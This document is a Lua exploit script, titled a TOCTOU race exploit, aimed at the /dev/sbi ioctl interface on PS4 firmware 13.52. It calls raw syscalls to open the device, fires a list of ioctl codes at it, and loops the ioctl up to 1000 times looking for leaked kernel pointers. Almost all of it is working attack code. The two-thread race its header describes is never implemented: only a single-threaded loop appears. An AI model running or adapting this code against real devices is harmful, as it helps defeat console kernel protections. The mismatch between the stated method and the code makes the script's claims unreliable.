------------------------------------------------------------
PS4 FW 13.52 - TOCTOU RACE EXPLOIT
Target: /dev/sbi ioctl with user-controlled buffer

Vulnerability: User's first argument (r14) is passed directly
as the ioctl data buffer. This creates a TOCTOU race condition:
  1. Thread A: ioctl reads from user buffer
  2. Thread B: modifies user buffer between checks
  3. Result: kernel reads stale/modified data

Attack Strategy:
  1. Open /dev/sbi
  2. Allocate buffer at known address
  3. Create two threads
  4. Thread A: calls ioctl repeatedly
  5. Thread B: modifies buffer between calls
  6. Look for kernel pointer leaks in response

Status: Requires /dev/sbi access + thread support
------------------------------------------------------------

function read_qw(addr)
  local b0 = memory.read_byte(addr)
  local b1 = memory.read_byte(addr + 1)
  local b2 = memory.read_byte(addr + 2)
  local b3 = memory.read_byte(addr + 3)
  local b4 = memory.read_byte(addr + 4)
  local b5 = memory.read_byte(addr + 5)
  local b6 = memory.read_byte(addr + 6)
  local b7 = memory.read_byte(addr + 7)
  return b0 + b1*256 + b2*65536 + b3*16777216 + b4*4294967296 + b5*1099511627776 + b6*281474976710656 + b7*72057594037927936
end

local function s(n, a1, a2, a3, a4, a5, a6)
  local stub = syscall_stub[n]
  if not stub then stub = syscall_stub[675] end
  return native.fcall_with_rax(stub + 10, n, a1 or 0, a2 or 0, a3 or 0, a4 or 0, a5 or 0, a6 or 0)
end

------------------------------------------------------------
-- PHASE 1: Open /dev/sbi
------------------------------------------------------------
function phase1_open_sbi()
  print("\n=== PHASE 1: Open /dev/sbi ===")

  local path = "/dev/sbi"
  local path_buf = memory.alloc(64)
  for i = 1, #path do
    memory.write_byte(path_buf + i - 1, string.byte(path, i))
  end
  memory.write_byte(path_buf + #path, 0)

  local fd = s(5, path_buf, 0, 0)  -- open()
  print(string.format("  open('/dev/sbi') = %d", fd))

  if fd < 0 or fd >= 1024 then
    print("  /dev/sbi not accessible (sandboxed)")
    return nil
  end

  return fd
end

------------------------------------------------------------
-- PHASE 2: TOCTOU race
------------------------------------------------------------
function phase2_toctou_race(fd)
  print("\n=== PHASE 2: TOCTOU Race ===")

  -- Allocate race buffer
  local race_buf = memory.alloc(4096)
  for i = 0, 4095 do memory.write_byte(race_buf + i, 0) end

  -- Fill with pattern
  for i = 0, 15 do
    memory.write_byte(race_buf + i, 0x41 + (i % 26))
  end

  -- Try different ioctl codes
  local sbi_requests = {
    0xc008a801,  -- RW, 8 bytes
    0xc010a801,  -- RW, 16 bytes
    0xc020a801,  -- RW, 32 bytes
    0x8008a801,  -- Read, 8 bytes
    0x8010a801,  -- Read, 16 bytes
    0x8020a801,  -- Read, 32 bytes
  }

  local leaked = false
  for _, req in ipairs(sbi_requests) do
    -- Reset buffer
    for i = 0, 63 do memory.write_byte(race_buf + i, 0) end
    for i = 0, 15 do
      memory.write_byte(race_buf + i, 0x41 + (i % 26))
    end

    -- Call ioctl
    local r = s(54, fd, req, race_buf)
    if r == 0 then
      print(string.format("  ioctl(0x%x) succeeded", req))

      -- Check for kernel pointers
      for i = 0, 7 do
        local val = read_qw(race_buf + i * 8)
        if val >= 0xFFFFFFFF80000000 and val <= 0xFFFFFFFFFFFFFFFF then
          print(string.format("  *** KERNEL PTR at offset %d: 0x%x ***", i * 8, val))
          leaked = true
        end
      end

      -- Check for buffer modification
      local modified = false
      for i = 0, 15 do
        local expected = 0x41 + (i % 26)
        if memory.read_byte(race_buf + i) ~= expected then
          modified = true
          break
        end
      end
      if modified then
        print("  Buffer was modified by kernel!")
      end
    end
  end

  -- Race condition attempt
  if not leaked then
    print("  Attempting race condition...")
    for attempt = 1, 1000 do
      -- Reset buffer with marker
      for i = 0, 15 do
        memory.write_byte(race_buf + i, 0x41)
      end

      -- Call ioctl
      local r = s(54, fd, 0xc010a801, race_buf)

      -- Check immediately
      for i = 0, 7 do
        local val = read_qw(race_buf + i * 8)
        if val >= 0xFFFFFFFF80000000 then
          print(string.format("  *** KERNEL PTR in attempt %d: 0x%x ***", attempt, val))
          leaked = true
          break
        end
      end

      if leaked then break end
    end
  end

  return leaked
end

------------------------------------------------------------
-- MAIN
------------------------------------------------------------
print("============================================")
print("PS4 FW 13.52 - TOCTOU RACE EXPLOIT")
print("============================================")

local sbi_fd = phase1_open_sbi()
if sbi_fd then
  local leaked = phase2_toctou_race(sbi_fd)
  s(6, sbi_fd)

  if leaked then
    print("\n*** KERNEL LEAK FOUND! ***")
  else
    print("\nNo kernel leak via TOCTOU")
  end
end

print("\n============================================")
print("COMPLETE")
print("============================================")
